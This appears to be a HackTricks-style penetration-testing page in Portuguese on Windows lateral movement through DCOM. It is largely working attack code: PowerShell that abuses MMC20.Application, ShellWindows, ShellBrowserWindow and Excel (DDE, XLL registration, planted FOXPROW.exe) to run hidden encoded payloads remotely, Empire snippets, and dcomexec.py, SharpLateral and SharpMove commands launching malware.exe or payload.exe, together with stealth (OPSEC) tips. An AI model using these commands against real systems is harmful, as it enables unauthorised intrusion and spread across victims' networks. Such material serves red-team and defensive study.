# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement é atraente porque reutiliza servidores COM existentes expostos via RPC/DCOM em vez de criar um serviço ou uma tarefa agendada. Na prática, isso significa que a conexão inicial normalmente começa em TCP/135 e depois passa para portas RPC altas atribuídas dinamicamente.

## Pré-requisitos & Gotchas

- Normalmente você precisa de um contexto de administrador local no alvo e o servidor COM remoto deve permitir remote launch/activation.
- Desde **14 de março de 2023**, a Microsoft impõe o endurecimento de DCOM para sistemas suportados. Clientes antigos que solicitam um baixo nível de autenticação de ativação podem falhar, a menos que negociem pelo menos `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Clientes modernos do Windows geralmente são ajustados automaticamente, então as ferramentas atuais normalmente continuam funcionando.
- Execução DCOM manual ou via script geralmente precisa de TCP/135 mais o range de portas RPC dinâmicas do alvo. Se você estiver usando `dcomexec.py` do Impacket e quiser o retorno da saída do comando, normalmente também precisa de acesso SMB ao `ADMIN$` (ou a outro share gravável/legível).
- Se RPC/DCOM funcionar, mas SMB estiver bloqueado, `dcomexec.py -nooutput` ainda pode ser útil para execução cega.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Para mais informações sobre esta técnica, confira o post original em [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Objetos Distributed Component Object Model (DCOM) apresentam uma capacidade interessante para interações baseadas em rede com objetos. A Microsoft fornece documentação abrangente tanto para DCOM quanto para Component Object Model (COM), acessível [aqui para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [aqui para COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Uma lista de aplicações DCOM pode ser obtida usando o comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
O objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite a automação de operações de snap-in do MMC. Notavelmente, esse objeto contém um método `ExecuteShellCommand` em `Document.ActiveView`. Mais informações sobre esse método podem ser encontradas [aqui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Veja-o em execução:

Esse recurso facilita a execução de comandos pela rede por meio de uma aplicação DCOM. Para interagir com DCOM remotamente como admin, o PowerShell pode ser utilizado da seguinte forma:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando se conecta à aplicação DCOM e retorna uma instância do objeto COM. O método ExecuteShellCommand pode então ser invocado para executar um processo no host remoto. O processo envolve os seguintes passos:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtenha RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
O último argumento é o estilo da janela. `7` mantém a janela minimizada. Operacionalmente, a execução baseada em MMC geralmente leva a um processo remoto `mmc.exe` iniciando seu payload, o que é diferente dos objetos baseados no Explorer abaixo.

## ShellWindows & ShellBrowserWindow

**Para mais informações sobre esta técnica, confira o post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

O objeto **MMC20.Application** foi identificado como não tendo "LaunchPermissions" explícitas, assumindo por padrão permissões que permitem acesso a Administrators. Para mais detalhes, um tópico pode ser explorado [aqui](https://twitter.com/tiraniddo/status/817532039771525120), e o uso do OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sem Launch Permission explícita é recomendado.

Dois objetos específicos, `ShellBrowserWindow` e `ShellWindows`, foram destacados devido à ausência de Launch Permissions explícitas. A ausência de uma entrada de registro `LaunchPermission` em `HKCR:\AppID\{guid}` significa que não há permissões explícitas.

Comparados com `MMC20.Application`, esses objetos geralmente são mais discretos do ponto de vista de OPSEC, porque o comando comumente acaba como filho de `explorer.exe` no host remoto em vez de `mmc.exe`.

### ShellWindows

Para `ShellWindows`, que não possui um ProgID, os métodos .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitam a instanciação do objeto usando seu AppID. Esse processo utiliza o OleView .NET para obter o CLSID de `ShellWindows`. Uma vez instanciado, a interação é possível por meio do método `WindowsShell.Item`, levando à invocação de métodos como `Document.Application.ShellExecute`.

Foram fornecidos exemplos de comandos PowerShell para instanciar o objeto e executar comandos remotamente:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` é similar, mas você pode instanciá-lo diretamente via seu CLSID e pivotar para `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Movimento lateral com Excel DCOM Objects

O movimento lateral pode ser alcançado explorando DCOM Excel objects. Para informações detalhadas, é aconselhável ler a discussão sobre aproveitar Excel DDE para movimento lateral via DCOM no [blog da Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

O projeto Empire fornece um script PowerShell, que demonstra a utilização do Excel para remote code execution (RCE) manipulando DCOM objects. Abaixo estão trechos do script disponível no [repositório GitHub do Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar do Excel para RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Pesquisas recentes ampliaram essa área com o método `ActivateMicrosoftApp()` do `Excel.Application`. A ideia principal é que o Excel pode tentar iniciar aplicativos Microsoft legados como FoxPro, Schedule Plus ou Project pesquisando o `PATH` do sistema. Se um operador conseguir colocar um payload com um desses nomes esperados em um local gravável que faça parte do `PATH` do alvo, o Excel o executará.

Requisitos para essa variação:

- Local admin no alvo
- Excel instalado no alvo
- Capacidade de gravar um payload em um diretório gravável no `PATH` do alvo

Exemplo prático abusando da busca do FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Se o host atacante não tiver o ProgID local `Excel.Application` registrado, instancie o objeto remoto por CLSID em vez disso:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Valores vistos sendo abusados na prática:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Ferramentas de Automação para Lateral Movement

Duas ferramentas são destacadas para automatizar essas técnicas:

- **Invoke-DCOM.ps1**: Um script PowerShell fornecido pelo projeto Empire que simplifica a invocação de diferentes métodos para executar código em máquinas remotas. Este script está доступível no repositório GitHub do Empire.

- **SharpLateral**: Uma ferramenta projetada para executar código remotamente, que pode ser usada com o comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as formas comentadas de executar código em outras máquinas.
- Você pode usar o `dcomexec.py` do Impacket para executar comandos em sistemas remotos usando DCOM. As versões atuais suportam `ShellWindows`, `ShellBrowserWindow` e `MMC20`, e o padrão é `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Você também poderia usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Você também poderia usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referências

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
